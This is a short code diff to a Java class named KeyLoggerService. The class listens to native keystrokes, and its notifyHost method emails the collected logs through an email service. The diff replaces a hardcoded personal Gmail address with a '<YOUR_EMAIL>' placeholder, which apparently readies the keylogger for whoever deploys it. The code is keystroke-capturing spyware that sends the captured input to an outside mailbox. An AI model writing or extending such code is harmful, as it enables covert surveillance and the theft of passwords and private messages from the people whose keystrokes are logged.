@@ -36,7 +36,7 @@ public class KeyLoggerService implements NativeKeyListener {
     }
 
     public void notifyHost() {
-        emailService.sendEmail("karol05ks@gmail.com", "logsReport", pullLogs());
+        emailService.sendEmail("<YOUR_EMAIL>", "logsReport", pullLogs());
     }
 
     public String pullLogs() {
